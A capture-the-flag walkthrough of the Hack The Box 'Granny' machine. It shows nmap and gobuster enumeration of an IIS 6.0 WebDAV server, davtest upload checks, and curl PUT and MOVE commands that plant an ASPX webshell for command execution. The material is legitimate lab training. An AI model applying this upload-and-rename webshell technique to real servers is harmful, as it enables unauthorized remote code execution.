# Granny Walkthrough

## Enumeration
Initial nmap scan.... the public options is interesting...
```
# Nmap 7.93 scan initiated Tue Jul  4 11:23:26 2023 as: nmap -Pn -n -T4 -p 80 -sCV -oN initial 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Tue, 04 Jul 2023 15:23:34 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  4 11:23:39 2023 -- 1 IP address (1 host up) scanned in 12.88 seconds
```

Gobuster for good measure.
```
┌──(kali㉿kali)-[~/htb/granny]
└─$ gobuster dir -u http://10.10.10.15/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.15/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/07 08:51:01 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 149] [--> http://10.10.10.15/images/]
/Images               (Status: 301) [Size: 149] [--> http://10.10.10.15/Images/]
/IMAGES               (Status: 301) [Size: 149] [--> http://10.10.10.15/IMAGES/]
/_private             (Status: 301) [Size: 153] [--> http://10.10.10.15/%5Fprivate/]
Progress: 220546 / 220561 (99.99%)
===============================================================
2023/07/07 09:00:02 Finished
===============================================================
```

Manual testing the public options to see what I can do with it.
```
┌──(kali㉿kali)-[~/htb/granny]
└─$ echo hello world! > test.txt
                                                                                                                   
┌──(kali㉿kali)-[~/htb/granny]
└─$ cat test.txt
hello world!
                                                                                                                   
┌──(kali㉿kali)-[~/htb/granny]
└─$ curl -X PUT http://10.10.10.15/test.txt -d @test.txt
                                                                                                                   
┌──(kali㉿kali)-[~/htb/granny]
└─$ curl http://10.10.10.15/test.txt                    
hello world!

┌──(kali㉿kali)-[~/htb/granny]
└─$ echo hello world! > test.aspx                       
                                                                                                                   
┌──(kali㉿kali)-[~/htb/granny]
└─$ cat test.aspx                   
hello world!
                                                                                                                   
┌──(kali㉿kali)-[~/htb/granny]
└─$ curl -X PUT http://10.10.10.15/test.aspx -d @test.txt 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>

<h1>The page cannot be displayed</h1>
You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
<hr>
<p>Please try the following:</p>
<ul>
<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
</ul>
<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
<hr>
<p>Technical Information (for support personnel)</p>
<ul>
<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>403</b>.</li>
<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
 and search for topics titled <b>Configuring ISAPI Extensions</b>, <b>Configuring CGI Applications</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
<li>In the IIS Software Development Kit (SDK) or at the <a href="http://go.microsoft.com/fwlink/?LinkId=8181">MSDN Online Library</a>, search for topics titled <b>Developing ISAPI Extensions</b>, <b>ISAPI and CGI</b>, and <b>Debugging ISAPI Extensions and Filters</b>.</li>
</ul>

</TD></TR></TABLE></BODY></HTML>
```

Used davtest to see what files can be uploaded and executed... asp and aspx fail, but I can still upload other file types.
```
┌──(kali㉿kali)-[~/htb/granny]
└─$ davtest -url http://10.10.10.15/
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: 8CjWHbscRrX
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_8CjWHbscRrX
********************************************************
 Sending test files
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.jsp
PUT     asp     FAIL
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.php
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.jhtml
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.txt
PUT     aspx    FAIL
PUT     cgi     FAIL
PUT     shtml   FAIL
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.pl
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.cfm
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.html
********************************************************
 Checking for test file execution
EXEC    jsp     FAIL
EXEC    php     FAIL
EXEC    jhtml   FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.txt
EXEC    txt     FAIL
EXEC    pl      FAIL
EXEC    cfm     FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.html
EXEC    html    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_8CjWHbscRrX
PUT File: http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.jsp
PUT File: http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.php
PUT File: http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.jhtml
PUT File: http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.txt
PUT File: http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.pl
PUT File: http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.cfm
PUT File: http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.html
Executes: http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.txt
Executes: http://10.10.10.15/DavTestDir_8CjWHbscRrX/davtest_8CjWHbscRrX.html
```

Copying a payload cmdasp.aspx.

Getting the foothold.
```
┌──(kali㉿kali)-[~/htb/granny]
└─$ cp /usr/share/webshells/aspx/cmdasp.aspx .
                                                                                                                   
┌──(kali㉿kali)-[~/htb/granny]
└─$ curl -X PUT http://10.10.10.15/shell.txt -d @cmdasp.aspx
                                                                                                                   
┌──(kali㉿kali)-[~/htb/granny]
└─$ curl -X MOVE -H 'Destination:http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
```
Navigate to http://10.10.10.15/shell.aspx for a webshell.

Setup a listener and catch the cmd shell.

[<img height="600" width="600px" src="https://github.com/zmiddle/htb/blob/main/granny/granny_pwned.png" />](https://www.hackthebox.com/achievement/machine/259690/14) 
